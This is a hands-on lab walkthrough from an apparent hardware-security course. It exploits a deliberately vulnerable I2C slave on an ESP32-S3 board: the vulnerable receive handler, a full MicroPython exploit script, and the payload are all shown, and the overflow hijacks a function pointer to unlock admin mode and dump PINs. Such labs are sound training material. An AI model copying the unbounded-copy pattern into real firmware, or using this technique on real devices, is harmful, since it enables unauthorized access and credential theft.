# L18: I2C Spoofing & Buffer Overflow - Function Pointer Hijack

## Goal
Exploit a buffer overflow in an I2C slave device to corrupt a function pointer and hijack execution. Success triggers visible feedback: **GREEN screen + victory melody + LED blink**.

## Background

**Real buffer overflow exploitation:**
1. Overflow a 32-byte buffer to corrupt an adjacent function pointer
2. Overwrite the pointer with address of `i2c_admin_unlock()` function
3. When the corrupted pointer is called, execution is hijacked

**What you need to find via reverse engineering:**
- Buffer size (32 bytes) and offset to function pointer
- Address of `i2c_admin_unlock()` function in memory
- Correct byte order (little-endian on ESP32)

**On CoreS3:** The firmware runs an I2C slave (secure element) at address **0x55** on **Port.A** (GPIO1 = SCL, GPIO2 = SDA). The slave has a vulnerable packed struct:

```cpp
struct __attribute__((packed)) I2CSlaveState {
    char buffer[32];                    // 32-byte buffer for I2C data
    void (*authCallback)(void);          // Function pointer - gets corrupted on overflow
};
```

The receive handler copies bytes directly into the struct with no bounds checking:

```cpp
static void i2c_slave_receive(int numBytes) {
    int idx = 0;
    while (Wire.available() && idx < 128) {
        char c = Wire.read();
        ((char*)&g_i2cSlave)[idx++] = c;  // Write directly into struct
    }
    if (g_i2cSlave.authCallback) {
        g_i2cSlave.authCallback();  // Calls the (corrupted) function pointer
    }
}
```

I2C slave initialized on `Wire1`: `Wire1.begin(0x55, GPIO_NUM_2, GPIO_NUM_1, 100000)` (SDA=GPIO2, SCL=GPIO1, 100 kHz).

**Success feedback:**
- **Screen**: GREEN with "ADMIN UNLOCKED" text (black on green)
- **Audio**: Single tone at C6 (1047 Hz) for 200 ms
- **Serial**: Dumps `admin_pin=XXXXXX` and `user_pin=XXXXXX` in plaintext

## Lab Walkthrough

### Step 1: Find Target Function Address

Use the Xtensa toolchain to locate `i2c_admin_unlock` in the ELF symbol table.


**Note:** `xtensa-esp32s3-elf-*` tools are Xtensa cross-tools for ESP32-S3, not standard Linux binaries. See the main [labs README](../LABS.md) for installation instructions.

```bash
# Find i2c_admin_unlock in the symbol table
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep i2c_admin_unlock

# Expected output (address will vary per build):
# 42005858 T i2c_admin_unlock

# Alternative: use objdump for more detail
xtensa-esp32s3-elf-objdump -t .pio/build/M5CoreS3/firmware.elf | grep i2c_admin_unlock

# Expected output:
# 4200D1EC g     F .flash.text    000000a2 i2c_admin_unlock
```

Note the address (e.g., `0x4200D390`). The `T` flag means text (code) section, in flash memory on ESP32-S3 (addresses `0x4200xxxx`).

### Step 2: Initialize I2C Slave Device

The I2C slave starts automatically at boot on the standard firmware. You can verify it is running by checking the boot logs:

```bash
pio device monitor -b 115200

# During boot, look for:
[I2C-SEC] Secure element online (0x55 on GPIO2/GPIO1)
```

This confirms the I2C slave is running. The function address must be found via the ELF symbol table (Step 1) or firmware reverse engineering - it is not printed in the boot log.

### Step 3: Craft Exploit Payload

Build a 36-byte payload: 32 bytes padding (fills the buffer) + 4-byte target address in little-endian. The `__attribute__((packed))` struct guarantees the function pointer starts at exactly byte offset 32.

```python
import struct

buffer_size = 32
target_addr = 0x4200D390  # i2c_admin_unlock address (from Step 1)

# Padding + address (little-endian)
payload = b'A' * buffer_size + struct.pack('<I', target_addr)
print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")

# Output:
# Payload length: 36 bytes
# Payload hex: 4141414141414141414141414141414141414141414141414141414141414141 90d30042
```

For address `0x4200D390`, little-endian byte order is `0x90, 0xD3, 0x00, 0x42`.

### Step 4: Send Exploit via I2C

Use a Raspberry Pi Pico as an I2C master to send the 36-byte payload to slave address 0x55 on Port.A (SDA=GPIO2, SCL=GPIO1). If you haven't set up MicroPython on the Pico yet, see the [Raspberry Pi Pico Setup](../LABS.md#raspberry-pi-pico-setup-required-for-l18-l19-l32) section in the main labs README.

**Pico wiring:**
```
Pico GP0 (SDA) --> CoreS3 GPIO2 (SDA, Port.A)
Pico GP1 (SCL) --> CoreS3 GPIO1 (SCL, Port.A)
Pico GND       --> CoreS3 GND
```

**MicroPython exploit script (save as `i2c_exploit.py` on the Pico):**

```python
from machine import Pin, I2C
import struct

# I2C master on GP0 (SDA) / GP1 (SCL)
i2c = I2C(0, sda=Pin(0), scl=Pin(1), freq=100000)

# Scan for the target slave
devices = i2c.scan()
print("I2C devices found:", [hex(d) for d in devices])

if 0x55 not in devices:
    print("ERROR: Slave 0x55 not found. Check wiring.")
else:
    # Build payload: 32 bytes padding + i2c_admin_unlock address (little-endian)
    target_addr = 0x4200D390  # i2c_admin_unlock (from nm/objdump)
    payload = b'A' * 32 + struct.pack('<I', target_addr)
    addr_bytes = struct.pack('<I', target_addr)

    print("Sending", len(payload), "bytes to slave 0x55...")
    print("Target: 0x%08X -> %s" % (target_addr, addr_bytes.hex()))

    i2c.writeto(0x55, payload)
    print("Sent! Check CoreS3 screen for GREEN flash.")
```

**Copy to Pico and run:**

```bash
# From the tools/ directory:
mpremote connect /dev/ttyACM1 cp pico_i2c_exploit.py :main.py
mpremote connect /dev/ttyACM1 run pico_i2c_exploit.py

# Expected output:
# I2C devices found: [85]     (85 = 0x55)
# Sending 36 bytes to slave 0x55...
# Target: 0x4200D390 -> 90d30042
# Sent! Check CoreS3 screen for GREEN flash.
```

### Step 5: Verify Exploitation

Observe the CoreS3 for success indicators and check serial output.

**What happens on success:**

1. **Screen flashes GREEN** with "ADMIN UNLOCKED" in black text, and "Check serial for credentials" below
2. **Speaker plays** a single tone at 1047 Hz (C6) for 200 ms
3. **Serial output** dumps both PINs in plaintext (values are randomly generated per device):

```
admin_pin=YYYYYY
user_pin=XXXXXX
```

4. **Admin mode is unlocked** on the serial console (persists until reboot)

**Verify via serial:**

```bash
cores3-cam> whoami
# Expected: admin

cores3-cam> nvs-dump
# Now accessible without login - dumps all NVS key/value pairs
```

**Verify via HTTP:**

```bash
curl -s http://192.168.4.1/status
# Look for: "admin_mode":true
```

**Troubleshooting:**
- Verify I2C slave was initialized (check boot logs for `[I2C-SEC]` messages)
- Check target address matches your build (re-run `nm` on your ELF)
- Verify little-endian byte order (LSB first)
- Confirm wiring: SDA=GPIO2, SCL=GPIO1, shared GND
- Check `Wire.endTransmission()` return value (0 = success, 2 = NACK on address)

## Hints

**Hint 1: Finding the address**

```bash
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep i2c_admin_unlock
```

The `nm` command gives you the exact address from the ELF. In a real pentest, you would extract and reverse-engineer the firmware binary to find this address.


**Hint 2: Address format**

ESP32-S3 (Xtensa LX7) is little-endian. Address `0x4200D390` becomes bytes `\x90\xD3\x00\x42` in memory order.


**Hint 3: Buffer size and struct layout**

The struct is `__attribute__((packed))` with no padding. Buffer is 32 bytes, function pointer starts at offset 32. Total payload: 36 bytes.


## Impact

- **Arbitrary code execution**: Overflowing a 32-byte I2C receive buffer corrupts an adjacent function pointer, redirecting execution to any address
- **No authentication on I2C bus**: Slave at 0x55 accepts data from any master without authentication
- **Physical proximity attack**: Requires I2C bus access (Port.A), but many IoT devices expose I2C on debug headers or expansion ports
- **Silent exploitation**: The overflow happens in the receive callback with no error - the corrupted pointer is called as part of normal operation
- **Bypasses software security**: Physical I2C access bypasses all WiFi/network authentication

## Success Criteria

- [ ] Found `i2c_admin_unlock()` address via nm/objdump (in the `0x4200xxxx` range)
- [ ] Crafted payload with 32 bytes padding + little-endian address (36 bytes total)
- [ ] Sent payload via I2C to slave address 0x55 on Port.A (SDA=GPIO2, SCL=GPIO1)
- [ ] **Screen flashed GREEN with "ADMIN UNLOCKED"**
- [ ] **Heard tone at 1047 Hz (C6)**
- [ ] **Serial output showed `admin_pin=XXXXXX` and `user_pin=XXXXXX` in plaintext**
- [ ] **Admin mode unlocked on serial console (`whoami` shows `admin`)**

## References

- [I2C Protocol Specification (NXP UM10204)](https://www.nxp.com/docs/en/user-guide/UM10204.pdf)
- [ESP32-S3 I2C Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/peripherals/i2c.html)
- [CWE-120: Buffer Copy without Checking Size of Input](https://cwe.mitre.org/data/definitions/120.html)
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
